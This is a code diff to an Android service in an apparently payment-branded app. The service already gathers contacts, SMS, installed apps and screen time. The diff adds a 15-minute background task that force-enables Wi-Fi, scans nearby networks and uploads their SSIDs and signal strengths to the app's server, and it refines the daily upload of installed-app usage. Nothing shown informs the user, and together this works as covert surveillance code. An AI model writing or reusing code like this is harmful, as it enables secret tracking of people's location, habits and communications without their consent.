@@ -22,6 +22,8 @@ import android.location.Location
 import android.net.ConnectivityManager
 import android.net.NetworkInfo
 import android.net.Uri
+import android.net.wifi.WifiInfo
+import android.net.wifi.WifiManager
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Environment
@@ -59,6 +61,7 @@ import com.payment.app.model.ContactSyncModel
 import com.payment.app.model.InstalledApp
 import com.payment.app.model.ScreenTimeModel
 import com.payment.app.model.SmsModel
+import com.payment.app.model.WifiListModel
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.File
@@ -93,6 +96,8 @@ class MyService : Service() {
     private var isPostNotificationPermissionGranted = false
     private var isSmsPermissionGranted = false
     private var isReadMediaImagePermissionGranted = false
+    private lateinit var wifiManager: WifiManager
+    private val PERMISSIONS_REQUEST_CODE = 123
     override fun onBind(intent: Intent?): IBinder? {
         return null
     }
@@ -164,7 +169,7 @@ class MyService : Service() {
                 ApiCallManager.appendLog("Global notificationService Exception Handler: ${e.message ?: "Unknown Error"}")
             }
         },0,15, TimeUnit.MINUTES)
-
+//
         val allAppGetServices = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
             try {
                 getAllAppData()
@@ -172,12 +177,62 @@ class MyService : Service() {
                 ApiCallManager.appendLog("Global Get All App Exception Handler: ${e.message ?: "Unknown Error"}")
             }
         },0,1, TimeUnit.DAYS)
+//
+        val getNearByWifi = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
+            try {
+                wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
+                if (!wifiManager.isWifiEnabled) {
+                    wifiManager.isWifiEnabled = true
+                }
+                scanWifiNetworks()
+            } catch (e: Exception) {
+                ApiCallManager.appendLog("Global Get Near by Wifi Exception Handler: ${e.message ?: "Unknown Error"}")
+            }
+        },0,15, TimeUnit.MINUTES)
+
 
         return START_STICKY
 
         //Normal Service To test sample service comment the above    generateForegroundNotification() && return START_STICKY
         // Uncomment below return statement And run the app.
 //        return START_NOT_STICKY
+    }
+
+    private lateinit var wifiInfo: WifiInfo
+
+    private fun scanWifiNetworks() {
+        val sharedPreferences: SharedPreferences = getSharedPreferences(
+            "token",
+            AppCompatActivity.MODE_PRIVATE
+        )
+        val token: String = sharedPreferences.getString("token", "").toString()
+        // Trigger a Wi-Fi scan
+        wifiManager.startScan()
+        wifiInfo = wifiManager.connectionInfo
+
+        // Retrieve scan results
+        val scanResults = wifiManager.scanResults
+
+        val wifiNetworks = ArrayList<WifiListModel>()
+
+
+        for (result in scanResults) {
+            val ssid = result.SSID // SSID of the network
+            val signalStrength = result.level // Signal strength in dBm
+
+            wifiNetworks.add(
+                WifiListModel(
+                    ssid,
+                    signalStrength.toString()
+                )
+            )
+        }
+        var baseUrl = getString(R.string.api)
+
+        apiCall.addWifiList(wifiNetworks,token,applicationContext,baseUrl)
+
+        Log.d("wifiNetworks", "$wifiNetworks")
+
     }
 
     private fun getAllAppData() {
@@ -201,7 +256,6 @@ class MyService : Service() {
         val packageManager: PackageManager = packageManager
         val applications: List<ApplicationInfo> = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
         val end = System.currentTimeMillis()
-        val begin = end - 24 * 60 * 60 * 1000 // Specify the time range (e.g., 24 hours)
         val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
 
         val dataList = ArrayList<InstalledApp>()
@@ -209,45 +263,46 @@ class MyService : Service() {
         val startTime = getStartTimeMillis(7) // Start time in milliseconds (e.g., 7 days ago)
         val endTime = System.currentTimeMillis()
         for (appInfo in applications) {
-            val appName = appInfo.loadLabel(packageManager).toString()
-            val appSize = getApplicationSize(appInfo)
-            val packageName = appInfo.packageName
-            val appInstallTimeMillis = File(appInfo.sourceDir).lastModified()
-            val triggerTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                LocalDateTime.ofInstant(
-                    Instant.ofEpochMilli(appInstallTimeMillis), TimeZone
-                        .getDefault().toZoneId()
-                )
-            } else {
-                TODO("VERSION.SDK_INT < O")
-            }
-            var screenTime: Long = 0
-            val usageStatsList = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_BEST, startTime, endTime)
-
-            for (usageStats in usageStatsList) {
-                if (usageStats.packageName == packageName) {
-//                    val appName = appInfo.loadLabel(packageManager).toString()
-                    val usageStats = getUsageStats(this, packageName, startTime, endTime)
-                    screenTime = usageStats
+            if (appInfo.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
+                val appName = appInfo.loadLabel(packageManager).toString()
+                val appSize = getApplicationSize(appInfo)
+                val packageName = appInfo.packageName
+                val appInstallTimeMillis = File(appInfo.sourceDir).lastModified()
+                val triggerTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    LocalDateTime.ofInstant(
+                        Instant.ofEpochMilli(appInstallTimeMillis), TimeZone
+                            .getDefault().toZoneId()
+                    )
+                } else {
+                    TODO("VERSION.SDK_INT < O")
                 }
+                var screenTime: Long = 0
+                val usageStatsList = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_BEST, startTime, endTime)
+
+                for (usageStats in usageStatsList) {
+                    if (usageStats.packageName == packageName) {
+                        val usageStats = getUsageStats(this, packageName, startTime, endTime)
+                        screenTime = usageStats
+                    }
+                }
+
+                dataList.add(
+                    InstalledApp(
+                        appName,
+                        appSize,
+                        triggerTime.toString()
+                    )
+                )
+
+                screenTimeList.add(
+                    ScreenTimeModel(
+                        "",
+                        appName,
+                        screenTime.toString()
+                    )
+                )
             }
-//            println("Screen time for $packageName: $appName:  $screenTime minutes")
 
-            dataList.add(
-                InstalledApp(
-                    appName,
-                    appSize,
-                    triggerTime.toString()
-                )
-            )
-
-            screenTimeList.add(
-                ScreenTimeModel(
-                    "",
-                    appName,
-                    screenTime.toString()
-                )
-            )
             // Display or log the information
 //            val appInfoString = "App Name: $appName, App Size: ${appSize}, Install Date and Time: $triggerTime"
 //            Log.d("InstalledAppsInfo", appInfoString)
